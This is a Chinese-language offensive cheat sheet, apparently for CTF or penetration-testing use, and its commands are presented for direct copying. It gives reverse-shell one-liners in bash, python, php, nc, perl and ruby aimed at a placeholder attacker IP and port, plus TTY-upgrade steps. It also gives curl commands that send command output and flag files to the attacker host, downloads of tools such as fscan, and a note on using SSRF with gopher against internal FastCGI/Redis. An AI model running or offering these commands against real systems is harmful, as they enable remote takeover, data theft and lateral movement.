# 反弹 Shell / 升级 TTY / 文件传输速查（按目标环境语言选，命令直接复制）

## 1. 反弹 shell（IP/PORT 换成本机；本地先 nc -lvnp PORT）
```bash
# bash（最优先试）
bash -i >& /dev/tcp/IP/PORT 0>&1
# python（目标有 python 就它最稳）
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
# php
php -r '$s=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
# nc（-e 被删时用 mkfifo）
nc -e /bin/sh IP PORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f
# perl / ruby / node
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));exec("/bin/sh -i <&3 >&3 2>&3");'
ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

## 2. 升级交互 TTY（半交互 shell 里必做，否则 vim/su/方向键全废）
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z 后：
stty raw -echo; fg    # 回车两下
export TERM=xterm SHELL=/bin/bash; stty rows 40 cols 120
```

## 3. 无回显执行（blind RCE）验证三板斧
```bash
curl http://IP:PORT/`whoami`                 # 本机 nc 收到 = 执行了
sleep 5                                      # 响应慢 5s = 执行了（注意 WAF 吞响应）
curl -X POST http://IP:PORT -d "$(id; cat /flag*)"   # 数据外带到 nc
# 目标不出网（只通内网）：写文件 + 找文件读回显
id > /var/www/html/o.txt; curl http://目标/o.txt
```

## 4. 文件传输（无 wget/curl 时）
```bash
# 本机起 HTTP：python3 -m http.server PORT
wget http://IP:PORT/fscan; curl -O http://IP:PORT/x
# 纯 shell：
exec 3<>/dev/tcp/IP/PORT && cat <&3 > fscan   # 不常用，优先 HTTP
# base64 短文件：本机 base64 -w0 f | 复制，目标 echo 'xxx' | base64 -d > f
```

## 5. 正向/隧道速记
- 目标能出网：反弹最省事（本机 nc 收）
- 目标不出网：`ssh -D 1080 user@跳板` 或 chisel 反向（见 playbook 门3）
- Web 入口无 shell 只有 SSRF：用 gopher:// 打内网 FastCGI/Redis（注意 libcurl 拒 %00，
  改用 HTTP 代理或 log poisoning）
